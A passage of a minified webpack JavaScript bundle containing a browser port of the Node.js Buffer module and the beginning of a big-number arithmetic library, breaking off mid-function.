! function(e) {
    function t(i) { if (n[i]) return n[i].exports; var r = n[i] = { i: i, l: !1, exports: {} }; return e[i].call(r.exports, r, r.exports, t), r.l = !0, r.exports } var n = {};
    t.m = e, t.c = n, t.d = function(e, n, i) { t.o(e, n) || Object.defineProperty(e, n, { configurable: !1, enumerable: !0, get: i }) }, t.n = function(e) { var n = e && e.__esModule ? function() { return e.default } : function() { return e }; return t.d(n, "a", n), n }, t.o = function(e, t) { return Object.prototype.hasOwnProperty.call(e, t) }, t.p = "", t(t.s = 71) }([function(e, t) { "function" == typeof Object.create ? e.exports = function(e, t) { e.super_ = t, e.prototype = Object.create(t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }) } : e.exports = function(e, t) { e.super_ = t; var n = function() {};
        n.prototype = t.prototype, e.prototype = new n, e.prototype.constructor = e } }, function(e, t, n) {
    function i(e, t) { for (var n in e) t[n] = e[n] }

    function r(e, t, n) { return a(e, t, n) } var o = n(2),
        a = o.Buffer;
    a.from && a.alloc && a.allocUnsafe && a.allocUnsafeSlow ? e.exports = o : (i(o, t), t.Buffer = r), i(a, r), r.from = function(e, t, n) { if ("number" == typeof e) throw new TypeError("Argument must not be a number"); return a(e, t, n) }, r.alloc = function(e, t, n) { if ("number" != typeof e) throw new TypeError("Argument must be a number"); var i = a(e); return void 0 !== t ? "string" == typeof n ? i.fill(t, n) : i.fill(t) : i.fill(0), i }, r.allocUnsafe = function(e) { if ("number" != typeof e) throw new TypeError("Argument must be a number"); return a(e) }, r.allocUnsafeSlow = function(e) { if ("number" != typeof e) throw new TypeError("Argument must be a number"); return o.SlowBuffer(e) } }, function(e, t, n) {
    "use strict";
    (function(e) {
        function i() { return o.TYPED_ARRAY_SUPPORT ? 2147483647 : 1073741823 }

        function r(e, t) { if (i() < t) throw new RangeError("Invalid typed array length"); return o.TYPED_ARRAY_SUPPORT ? (e = new Uint8Array(t), e.__proto__ = o.prototype) : (null === e && (e = new o(t)), e.length = t), e }

        function o(e, t, n) { if (!(o.TYPED_ARRAY_SUPPORT || this instanceof o)) return new o(e, t, n); if ("number" == typeof e) { if ("string" == typeof t) throw new Error("If encoding is specified then the first argument must be a string"); return u(this, e) } return a(this, e, t, n) }

        function a(e, t, n, i) { if ("number" == typeof t) throw new TypeError('"value" argument must not be a number'); return "undefined" != typeof ArrayBuffer && t instanceof ArrayBuffer ? f(e, t, n, i) : "string" == typeof t ? l(e, t, n) : h(e, t) }

        function s(e) { if ("number" != typeof e) throw new TypeError('"size" argument must be a number'); if (e < 0) throw new RangeError('"size" argument must not be negative') }

        function c(e, t, n, i) { return s(t), t <= 0 ? r(e, t) : void 0 !== n ? "string" == typeof i ? r(e, t).fill(n, i) : r(e, t).fill(n) : r(e, t) }

        function u(e, t) { if (s(t), e = r(e, t < 0 ? 0 : 0 | p(t)), !o.TYPED_ARRAY_SUPPORT)
                for (var n = 0; n < t; ++n) e[n] = 0; return e }

        function l(e, t, n) { if ("string" == typeof n && "" !== n || (n = "utf8"), !o.isEncoding(n)) throw new TypeError('"encoding" must be a valid string encoding'); var i = 0 | m(t, n);
            e = r(e, i); var a = e.write(t, n); return a !== i && (e = e.slice(0, a)), e }

        function d(e, t) { var n = t.length < 0 ? 0 : 0 | p(t.length);
            e = r(e, n); for (var i = 0; i < n; i += 1) e[i] = 255 & t[i]; return e }

        function f(e, t, n, i) { if (t.byteLength, n < 0 || t.byteLength < n) throw new RangeError("'offset' is out of bounds"); if (t.byteLength < n + (i || 0)) throw new RangeError("'length' is out of bounds"); return t = void 0 === n && void 0 === i ? new Uint8Array(t) : void 0 === i ? new Uint8Array(t, n) : new Uint8Array(t, n, i), o.TYPED_ARRAY_SUPPORT ? (e = t, e.__proto__ = o.prototype) : e = d(e, t), e }

        function h(e, t) { if (o.isBuffer(t)) { var n = 0 | p(t.length); return e = r(e, n), 0 === e.length ? e : (t.copy(e, 0, 0, n), e) } if (t) { if ("undefined" != typeof ArrayBuffer && t.buffer instanceof ArrayBuffer || "length" in t) return "number" != typeof t.length || $(t.length) ? r(e, 0) : d(e, t); if ("Buffer" === t.type && Z(t.data)) return d(e, t.data) } throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.") }

        function p(e) { if (e >= i()) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + i().toString(16) + " bytes"); return 0 | e }

        function b(e) { return +e != e && (e = 0), o.alloc(+e) }

        function m(e, t) { if (o.isBuffer(e)) return e.length; if ("undefined" != typeof ArrayBuffer && "function" == typeof ArrayBuffer.isView && (ArrayBuffer.isView(e) || e instanceof ArrayBuffer)) return e.byteLength; "string" != typeof e && (e = "" + e); var n = e.length; if (0 === n) return 0; for (var i = !1;;) switch (t) {
                case "ascii":
                case "latin1":
                case "binary":
                    return n;
                case "utf8":
                case "utf-8":
                case void 0:
                    return V(e).length;
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return 2 * n;
                case "hex":
                    return n >>> 1;
                case "base64":
                    return Y(e).length;
                default:
                    if (i) return V(e).length;
                    t = ("" + t).toLowerCase(), i = !0 } }

        function g(e, t, n) { var i = !1; if ((void 0 === t || t < 0) && (t = 0), t > this.length) return ""; if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return ""; if (n >>>= 0, t >>>= 0, n <= t) return ""; for (e || (e = "utf8");;) switch (e) {
                case "hex":
                    return I(this, t, n);
                case "utf8":
                case "utf-8":
                    return T(this, t, n);
                case "ascii":
                    return R(this, t, n);
                case "latin1":
                case "binary":
                    return P(this, t, n);
                case "base64":
                    return E(this, t, n);
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return D(this, t, n);
                default:
                    if (i) throw new TypeError("Unknown encoding: " + e);
                    e = (e + "").toLowerCase(), i = !0 } }

        function v(e, t, n) { var i = e[t];
            e[t] = e[n], e[n] = i }

        function y(e, t, n, i, r) { if (0 === e.length) return -1; if ("string" == typeof n ? (i = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), n = +n, isNaN(n) && (n = r ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) { if (r) return -1;
                n = e.length - 1 } else if (n < 0) { if (!r) return -1;
                n = 0 } if ("string" == typeof t && (t = o.from(t, i)), o.isBuffer(t)) return 0 === t.length ? -1 : w(e, t, n, i, r); if ("number" == typeof t) return t &= 255, o.TYPED_ARRAY_SUPPORT && "function" == typeof Uint8Array.prototype.indexOf ? r ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : w(e, [t], n, i, r); throw new TypeError("val must be string, number or Buffer") }

        function w(e, t, n, i, r) {
            function o(e, t) { return 1 === a ? e[t] : e.readUInt16BE(t * a) } var a = 1,
                s = e.length,
                c = t.length; if (void 0 !== i && ("ucs2" === (i = String(i).toLowerCase()) || "ucs-2" === i || "utf16le" === i || "utf-16le" === i)) { if (e.length < 2 || t.length < 2) return -1;
                a = 2, s /= 2, c /= 2, n /= 2 } var u; if (r) { var l = -1; for (u = n; u < s; u++)
                    if (o(e, u) === o(t, -1 === l ? 0 : u - l)) { if (-1 === l && (l = u), u - l + 1 === c) return l * a } else -1 !== l && (u -= u - l), l = -1 } else
                for (n + c > s && (n = s - c), u = n; u >= 0; u--) { for (var d = !0, f = 0; f < c; f++)
                        if (o(e, u + f) !== o(t, f)) { d = !1; break }
                    if (d) return u }
            return -1 }

        function x(e, t, n, i) { n = Number(n) || 0; var r = e.length - n;
            i ? (i = Number(i)) > r && (i = r) : i = r; var o = t.length; if (o % 2 != 0) throw new TypeError("Invalid hex string");
            i > o / 2 && (i = o / 2); for (var a = 0; a < i; ++a) { var s = parseInt(t.substr(2 * a, 2), 16); if (isNaN(s)) return a;
                e[n + a] = s } return a }

        function S(e, t, n, i) { return X(V(t, e.length - n), e, n, i) }

        function _(e, t, n, i) { return X(W(t), e, n, i) }

        function k(e, t, n, i) { return _(e, t, n, i) }

        function C(e, t, n, i) { return X(Y(t), e, n, i) }

        function A(e, t, n, i) { return X(K(t, e.length - n), e, n, i) }

        function E(e, t, n) { return 0 === t && n === e.length ? G.fromByteArray(e) : G.fromByteArray(e.slice(t, n)) }

        function T(e, t, n) { n = Math.min(e.length, n); for (var i = [], r = t; r < n;) { var o = e[r],
                    a = null,
                    s = o > 239 ? 4 : o > 223 ? 3 : o > 191 ? 2 : 1; if (r + s <= n) { var c, u, l, d; switch (s) {
                        case 1:
                            o < 128 && (a = o); break;
                        case 2:
                            c = e[r + 1], 128 == (192 & c) && (d = (31 & o) << 6 | 63 & c) > 127 && (a = d); break;
                        case 3:
                            c = e[r + 1], u = e[r + 2], 128 == (192 & c) && 128 == (192 & u) && (d = (15 & o) << 12 | (63 & c) << 6 | 63 & u) > 2047 && (d < 55296 || d > 57343) && (a = d); break;
                        case 4:
                            c = e[r + 1], u = e[r + 2], l = e[r + 3], 128 == (192 & c) && 128 == (192 & u) && 128 == (192 & l) && (d = (15 & o) << 18 | (63 & c) << 12 | (63 & u) << 6 | 63 & l) > 65535 && d < 1114112 && (a = d) } } null === a ? (a = 65533, s = 1) : a > 65535 && (a -= 65536, i.push(a >>> 10 & 1023 | 55296), a = 56320 | 1023 & a), i.push(a), r += s } return M(i) }

        function M(e) { var t = e.length; if (t <= Q) return String.fromCharCode.apply(String, e); for (var n = "", i = 0; i < t;) n += String.fromCharCode.apply(String, e.slice(i, i += Q)); return n }

        function R(e, t, n) { var i = "";
            n = Math.min(e.length, n); for (var r = t; r < n; ++r) i += String.fromCharCode(127 & e[r]); return i }

        function P(e, t, n) { var i = "";
            n = Math.min(e.length, n); for (var r = t; r < n; ++r) i += String.fromCharCode(e[r]); return i }

        function I(e, t, n) { var i = e.length;
            (!t || t < 0) && (t = 0), (!n || n < 0 || n > i) && (n = i); for (var r = "", o = t; o < n; ++o) r += H(e[o]); return r }

        function D(e, t, n) { for (var i = e.slice(t, n), r = "", o = 0; o < i.length; o += 2) r += String.fromCharCode(i[o] + 256 * i[o + 1]); return r }

        function O(e, t, n) { if (e % 1 != 0 || e < 0) throw new RangeError("offset is not uint"); if (e + t > n) throw new RangeError("Trying to access beyond buffer length") }

        function j(e, t, n, i, r, a) { if (!o.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance'); if (t > r || t < a) throw new RangeError('"value" argument is out of bounds'); if (n + i > e.length) throw new RangeError("Index out of range") }

        function q(e, t, n, i) { t < 0 && (t = 65535 + t + 1); for (var r = 0, o = Math.min(e.length - n, 2); r < o; ++r) e[n + r] = (t & 255 << 8 * (i ? r : 1 - r)) >>> 8 * (i ? r : 1 - r) }

        function B(e, t, n, i) { t < 0 && (t = 4294967295 + t + 1); for (var r = 0, o = Math.min(e.length - n, 4); r < o; ++r) e[n + r] = t >>> 8 * (i ? r : 3 - r) & 255 }

        function L(e, t, n, i, r, o) { if (n + i > e.length) throw new RangeError("Index out of range"); if (n < 0) throw new RangeError("Index out of range") }

        function N(e, t, n, i, r) { return r || L(e, t, n, 4, 3.4028234663852886e38, -3.4028234663852886e38), J.write(e, t, n, i, 23, 4), n + 4 }

        function F(e, t, n, i, r) { return r || L(e, t, n, 8, 1.7976931348623157e308, -1.7976931348623157e308), J.write(e, t, n, i, 52, 8), n + 8 }

        function z(e) { if (e = U(e).replace(ee, ""), e.length < 2) return ""; for (; e.length % 4 != 0;) e += "="; return e }

        function U(e) { return e.trim ? e.trim() : e.replace(/^\s+|\s+$/g, "") }

        function H(e) { return e < 16 ? "0" + e.toString(16) : e.toString(16) }

        function V(e, t) { t = t || 1 / 0; for (var n, i = e.length, r = null, o = [], a = 0; a < i; ++a) { if ((n = e.charCodeAt(a)) > 55295 && n < 57344) { if (!r) { if (n > 56319) {
                            (t -= 3) > -1 && o.push(239, 191, 189); continue } if (a + 1 === i) {
                            (t -= 3) > -1 && o.push(239, 191, 189); continue } r = n; continue } if (n < 56320) {
                        (t -= 3) > -1 && o.push(239, 191, 189), r = n; continue } n = 65536 + (r - 55296 << 10 | n - 56320) } else r && (t -= 3) > -1 && o.push(239, 191, 189); if (r = null, n < 128) { if ((t -= 1) < 0) break;
                    o.push(n) } else if (n < 2048) { if ((t -= 2) < 0) break;
                    o.push(n >> 6 | 192, 63 & n | 128) } else if (n < 65536) { if ((t -= 3) < 0) break;
                    o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128) } else { if (!(n < 1114112)) throw new Error("Invalid code point"); if ((t -= 4) < 0) break;
                    o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128) } } return o }

        function W(e) { for (var t = [], n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n)); return t }

        function K(e, t) { for (var n, i, r, o = [], a = 0; a < e.length && !((t -= 2) < 0); ++a) n = e.charCodeAt(a), i = n >> 8, r = n % 256, o.push(r), o.push(i); return o }

        function Y(e) { return G.toByteArray(z(e)) }

        function X(e, t, n, i) { for (var r = 0; r < i && !(r + n >= t.length || r >= e.length); ++r) t[r + n] = e[r]; return r }

        function $(e) { return e !== e }
        /*!
         * The buffer module from node.js, for the browser.
         *
         * @author   Feross Aboukhadijeh <feross@feross.org> <http://feross.org>
         * @license  MIT
         */
        var G = n(73),
            J = n(74),
            Z = n(37);
        t.Buffer = o, t.SlowBuffer = b, t.INSPECT_MAX_BYTES = 50, o.TYPED_ARRAY_SUPPORT = void 0 !== e.TYPED_ARRAY_SUPPORT ? e.TYPED_ARRAY_SUPPORT : function() { try { var e = new Uint8Array(1); return e.__proto__ = { __proto__: Uint8Array.prototype, foo: function() { return 42 } }, 42 === e.foo() && "function" == typeof e.subarray && 0 === e.subarray(1, 1).byteLength } catch (e) { return !1 } }(), t.kMaxLength = i(), o.poolSize = 8192, o._augment = function(e) { return e.__proto__ = o.prototype, e }, o.from = function(e, t, n) { return a(null, e, t, n) }, o.TYPED_ARRAY_SUPPORT && (o.prototype.__proto__ = Uint8Array.prototype, o.__proto__ = Uint8Array, "undefined" != typeof Symbol && Symbol.species && o[Symbol.species] === o && Object.defineProperty(o, Symbol.species, { value: null, configurable: !0 })), o.alloc = function(e, t, n) { return c(null, e, t, n) }, o.allocUnsafe = function(e) { return u(null, e) }, o.allocUnsafeSlow = function(e) { return u(null, e) }, o.isBuffer = function(e) { return !(null == e || !e._isBuffer) }, o.compare = function(e, t) { if (!o.isBuffer(e) || !o.isBuffer(t)) throw new TypeError("Arguments must be Buffers"); if (e === t) return 0; for (var n = e.length, i = t.length, r = 0, a = Math.min(n, i); r < a; ++r)
                if (e[r] !== t[r]) { n = e[r], i = t[r]; break }
            return n < i ? -1 : i < n ? 1 : 0 }, o.isEncoding = function(e) { switch (String(e).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1 } }, o.concat = function(e, t) { if (!Z(e)) throw new TypeError('"list" argument must be an Array of Buffers'); if (0 === e.length) return o.alloc(0); var n; if (void 0 === t)
                for (t = 0, n = 0; n < e.length; ++n) t += e[n].length; var i = o.allocUnsafe(t),
                r = 0; for (n = 0; n < e.length; ++n) { var a = e[n]; if (!o.isBuffer(a)) throw new TypeError('"list" argument must be an Array of Buffers');
                a.copy(i, r), r += a.length } return i }, o.byteLength = m, o.prototype._isBuffer = !0, o.prototype.swap16 = function() { var e = this.length; if (e % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits"); for (var t = 0; t < e; t += 2) v(this, t, t + 1); return this }, o.prototype.swap32 = function() { var e = this.length; if (e % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits"); for (var t = 0; t < e; t += 4) v(this, t, t + 3), v(this, t + 1, t + 2); return this }, o.prototype.swap64 = function() { var e = this.length; if (e % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits"); for (var t = 0; t < e; t += 8) v(this, t, t + 7), v(this, t + 1, t + 6), v(this, t + 2, t + 5), v(this, t + 3, t + 4); return this }, o.prototype.toString = function() { var e = 0 | this.length; return 0 === e ? "" : 0 === arguments.length ? T(this, 0, e) : g.apply(this, arguments) }, o.prototype.equals = function(e) { if (!o.isBuffer(e)) throw new TypeError("Argument must be a Buffer"); return this === e || 0 === o.compare(this, e) }, o.prototype.inspect = function() { var e = "",
                n = t.INSPECT_MAX_BYTES; return this.length > 0 && (e = this.toString("hex", 0, n).match(/.{2}/g).join(" "), this.length > n && (e += " ... ")), "<Buffer " + e + ">" }, o.prototype.compare = function(e, t, n, i, r) { if (!o.isBuffer(e)) throw new TypeError("Argument must be a Buffer"); if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === i && (i = 0), void 0 === r && (r = this.length), t < 0 || n > e.length || i < 0 || r > this.length) throw new RangeError("out of range index"); if (i >= r && t >= n) return 0; if (i >= r) return -1; if (t >= n) return 1; if (t >>>= 0, n >>>= 0, i >>>= 0, r >>>= 0, this === e) return 0; for (var a = r - i, s = n - t, c = Math.min(a, s), u = this.slice(i, r), l = e.slice(t, n), d = 0; d < c; ++d)
                if (u[d] !== l[d]) { a = u[d], s = l[d]; break }
            return a < s ? -1 : s < a ? 1 : 0 }, o.prototype.includes = function(e, t, n) { return -1 !== this.indexOf(e, t, n) }, o.prototype.indexOf = function(e, t, n) { return y(this, e, t, n, !0) }, o.prototype.lastIndexOf = function(e, t, n) { return y(this, e, t, n, !1) }, o.prototype.write = function(e, t, n, i) { if (void 0 === t) i = "utf8", n = this.length, t = 0;
            else if (void 0 === n && "string" == typeof t) i = t, n = this.length, t = 0;
            else { if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                t |= 0, isFinite(n) ? (n |= 0, void 0 === i && (i = "utf8")) : (i = n, n = void 0) } var r = this.length - t; if ((void 0 === n || n > r) && (n = r), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
            i || (i = "utf8"); for (var o = !1;;) switch (i) {
                case "hex":
                    return x(this, e, t, n);
                case "utf8":
                case "utf-8":
                    return S(this, e, t, n);
                case "ascii":
                    return _(this, e, t, n);
                case "latin1":
                case "binary":
                    return k(this, e, t, n);
                case "base64":
                    return C(this, e, t, n);
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return A(this, e, t, n);
                default:
                    if (o) throw new TypeError("Unknown encoding: " + i);
                    i = ("" + i).toLowerCase(), o = !0 } }, o.prototype.toJSON = function() { return { type: "Buffer", data: Array.prototype.slice.call(this._arr || this, 0) } };
        var Q = 4096;
        o.prototype.slice = function(e, t) { var n = this.length;
            e = ~~e, t = void 0 === t ? n : ~~t, e < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n), t < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n), t < e && (t = e); var i; if (o.TYPED_ARRAY_SUPPORT) i = this.subarray(e, t), i.__proto__ = o.prototype;
            else { var r = t - e;
                i = new o(r, void 0); for (var a = 0; a < r; ++a) i[a] = this[a + e] } return i }, o.prototype.readUIntLE = function(e, t, n) { e |= 0, t |= 0, n || O(e, t, this.length); for (var i = this[e], r = 1, o = 0; ++o < t && (r *= 256);) i += this[e + o] * r; return i }, o.prototype.readUIntBE = function(e, t, n) { e |= 0, t |= 0, n || O(e, t, this.length); for (var i = this[e + --t], r = 1; t > 0 && (r *= 256);) i += this[e + --t] * r; return i }, o.prototype.readUInt8 = function(e, t) { return t || O(e, 1, this.length), this[e] }, o.prototype.readUInt16LE = function(e, t) { return t || O(e, 2, this.length), this[e] | this[e + 1] << 8 }, o.prototype.readUInt16BE = function(e, t) { return t || O(e, 2, this.length), this[e] << 8 | this[e + 1] }, o.prototype.readUInt32LE = function(e, t) { return t || O(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3] }, o.prototype.readUInt32BE = function(e, t) { return t || O(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]) }, o.prototype.readIntLE = function(e, t, n) { e |= 0, t |= 0, n || O(e, t, this.length); for (var i = this[e], r = 1, o = 0; ++o < t && (r *= 256);) i += this[e + o] * r; return r *= 128, i >= r && (i -= Math.pow(2, 8 * t)), i }, o.prototype.readIntBE = function(e, t, n) { e |= 0, t |= 0, n || O(e, t, this.length); for (var i = t, r = 1, o = this[e + --i]; i > 0 && (r *= 256);) o += this[e + --i] * r; return r *= 128, o >= r && (o -= Math.pow(2, 8 * t)), o }, o.prototype.readInt8 = function(e, t) { return t || O(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e] }, o.prototype.readInt16LE = function(e, t) { t || O(e, 2, this.length); var n = this[e] | this[e + 1] << 8; return 32768 & n ? 4294901760 | n : n }, o.prototype.readInt16BE = function(e, t) { t || O(e, 2, this.length); var n = this[e + 1] | this[e] << 8; return 32768 & n ? 4294901760 | n : n }, o.prototype.readInt32LE = function(e, t) { return t || O(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24 }, o.prototype.readInt32BE = function(e, t) { return t || O(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3] }, o.prototype.readFloatLE = function(e, t) { return t || O(e, 4, this.length), J.read(this, e, !0, 23, 4) }, o.prototype.readFloatBE = function(e, t) { return t || O(e, 4, this.length), J.read(this, e, !1, 23, 4) }, o.prototype.readDoubleLE = function(e, t) { return t || O(e, 8, this.length), J.read(this, e, !0, 52, 8) }, o.prototype.readDoubleBE = function(e, t) { return t || O(e, 8, this.length), J.read(this, e, !1, 52, 8) }, o.prototype.writeUIntLE = function(e, t, n, i) { if (e = +e, t |= 0, n |= 0, !i) { j(this, e, t, n, Math.pow(2, 8 * n) - 1, 0) } var r = 1,
                o = 0; for (this[t] = 255 & e; ++o < n && (r *= 256);) this[t + o] = e / r & 255; return t + n }, o.prototype.writeUIntBE = function(e, t, n, i) { if (e = +e, t |= 0, n |= 0, !i) { j(this, e, t, n, Math.pow(2, 8 * n) - 1, 0) } var r = n - 1,
                o = 1; for (this[t + r] = 255 & e; --r >= 0 && (o *= 256);) this[t + r] = e / o & 255; return t + n }, o.prototype.writeUInt8 = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 1, 255, 0), o.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), this[t] = 255 & e, t + 1 }, o.prototype.writeUInt16LE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 2, 65535, 0), o.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : q(this, e, t, !0), t + 2 }, o.prototype.writeUInt16BE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 2, 65535, 0), o.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : q(this, e, t, !1), t + 2 }, o.prototype.writeUInt32LE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 4, 4294967295, 0), o.TYPED_ARRAY_SUPPORT ? (this[t + 3] = e >>> 24, this[t + 2] = e >>> 16, this[t + 1] = e >>> 8, this[t] = 255 & e) : B(this, e, t, !0), t + 4 }, o.prototype.writeUInt32BE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 4, 4294967295, 0), o.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : B(this, e, t, !1), t + 4 }, o.prototype.writeIntLE = function(e, t, n, i) { if (e = +e, t |= 0, !i) { var r = Math.pow(2, 8 * n - 1);
                j(this, e, t, n, r - 1, -r) } var o = 0,
                a = 1,
                s = 0; for (this[t] = 255 & e; ++o < n && (a *= 256);) e < 0 && 0 === s && 0 !== this[t + o - 1] && (s = 1), this[t + o] = (e / a >> 0) - s & 255; return t + n }, o.prototype.writeIntBE = function(e, t, n, i) { if (e = +e, t |= 0, !i) { var r = Math.pow(2, 8 * n - 1);
                j(this, e, t, n, r - 1, -r) } var o = n - 1,
                a = 1,
                s = 0; for (this[t + o] = 255 & e; --o >= 0 && (a *= 256);) e < 0 && 0 === s && 0 !== this[t + o + 1] && (s = 1), this[t + o] = (e / a >> 0) - s & 255; return t + n }, o.prototype.writeInt8 = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 1, 127, -128), o.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), e < 0 && (e = 255 + e + 1), this[t] = 255 & e, t + 1 }, o.prototype.writeInt16LE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 2, 32767, -32768), o.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : q(this, e, t, !0), t + 2 }, o.prototype.writeInt16BE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 2, 32767, -32768), o.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : q(this, e, t, !1), t + 2 }, o.prototype.writeInt32LE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 4, 2147483647, -2147483648), o.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8, this[t + 2] = e >>> 16, this[t + 3] = e >>> 24) : B(this, e, t, !0), t + 4 }, o.prototype.writeInt32BE = function(e, t, n) { return e = +e, t |= 0, n || j(this, e, t, 4, 2147483647, -2147483648), e < 0 && (e = 4294967295 + e + 1), o.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : B(this, e, t, !1), t + 4 }, o.prototype.writeFloatLE = function(e, t, n) { return N(this, e, t, !0, n) }, o.prototype.writeFloatBE = function(e, t, n) { return N(this, e, t, !1, n) }, o.prototype.writeDoubleLE = function(e, t, n) { return F(this, e, t, !0, n) }, o.prototype.writeDoubleBE = function(e, t, n) { return F(this, e, t, !1, n) }, o.prototype.copy = function(e, t, n, i) { if (n || (n = 0), i || 0 === i || (i = this.length), t >= e.length && (t = e.length), t || (t = 0), i > 0 && i < n && (i = n), i === n) return 0; if (0 === e.length || 0 === this.length) return 0; if (t < 0) throw new RangeError("targetStart out of bounds"); if (n < 0 || n >= this.length) throw new RangeError("sourceStart out of bounds"); if (i < 0) throw new RangeError("sourceEnd out of bounds");
            i > this.length && (i = this.length), e.length - t < i - n && (i = e.length - t + n); var r, a = i - n; if (this === e && n < t && t < i)
                for (r = a - 1; r >= 0; --r) e[r + t] = this[r + n];
            else if (a < 1e3 || !o.TYPED_ARRAY_SUPPORT)
                for (r = 0; r < a; ++r) e[r + t] = this[r + n];
            else Uint8Array.prototype.set.call(e, this.subarray(n, n + a), t); return a }, o.prototype.fill = function(e, t, n, i) { if ("string" == typeof e) { if ("string" == typeof t ? (i = t, t = 0, n = this.length) : "string" == typeof n && (i = n, n = this.length), 1 === e.length) { var r = e.charCodeAt(0);
                    r < 256 && (e = r) } if (void 0 !== i && "string" != typeof i) throw new TypeError("encoding must be a string"); if ("string" == typeof i && !o.isEncoding(i)) throw new TypeError("Unknown encoding: " + i) } else "number" == typeof e && (e &= 255); if (t < 0 || this.length < t || this.length < n) throw new RangeError("Out of range index"); if (n <= t) return this;
            t >>>= 0, n = void 0 === n ? this.length : n >>> 0, e || (e = 0); var a; if ("number" == typeof e)
                for (a = t; a < n; ++a) this[a] = e;
            else { var s = o.isBuffer(e) ? e : V(new o(e, i).toString()),
                    c = s.length; for (a = 0; a < n - t; ++a) this[a + t] = s[a % c] } return this };
        var ee = /[^+\/0-9A-Za-z-_]/g
    }).call(t, n(7))
}, function(e, t, n) {
    (function(e) {! function(e, t) { "use strict";

            function i(e, t) { if (!e) throw new Error(t || "Assertion failed") }

            function r(e, t) { e.super_ = t; var n = function() {};
                n.prototype = t.prototype, e.prototype = new n, e.prototype.constructor = e }

            function o(e, t, n) { if (o.isBN(e)) return e;
                this.negative = 0, this.words = null, this.length = 0, this.red = null, null !== e && ("le" !== t && "be" !== t || (n = t, t = 10), this._init(e || 0, t || 10, n || "be")) }

            function a(e, t, n) { for (var i = 0, r = Math.min(e.length, n), o = t; o < r; o++) { var a = e.charCodeAt(o) - 48;
                    i <<= 4, i |= a >= 49 && a <= 54 ? a - 49 + 10 : a >= 17 && a <= 22 ? a - 17 + 10 : 15 & a } return i }

            function s(e, t, n, i) { for (var r = 0, o = Math.min(e.length, n), a = t; a < o; a++) { var s = e.charCodeAt(a) - 48;
                    r *= i, r += s >= 49 ? s - 49 + 10 : s >= 17 ? s - 17 + 10 : s } return r }

            function c(e) { for (var t = new Array(e.bitLength()), n = 0; n < t.length; n++) { var i = n / 26 | 0,
                        r = n % 26;
                    t[n] = (e.words[i] & 1 << r) >>> r } return t }

            function u(e, t, n) { n.negative = t.negative ^ e.negative; var i = e.length + t.length | 0;
                n.length = i, i = i - 1 | 0; var r = 0 | e.words[0],
                    o = 0 | t.words[0],
                    a = r * o,
                    s = 67108863 & a,
                    c = a / 67108864 | 0;
                n.words[0] = s; for (var u = 1; u < i; u++) { for (var l = c >>> 26, d = 67108863 & c, f = Math.min(u, t.length - 1), h = Math.max(0, u - e.length + 1); h <= f; h++) { var p = u - h | 0;
                        r = 0 | e.words[p], o = 0 | t.words[h], a = r * o + d, l += a / 67108864 | 0, d = 67108863 & a } n.words[u] = 0 | d, c = 0 | l } return 0 !== c ? n.words[u] = 0 | c : n.length--, n.strip() }

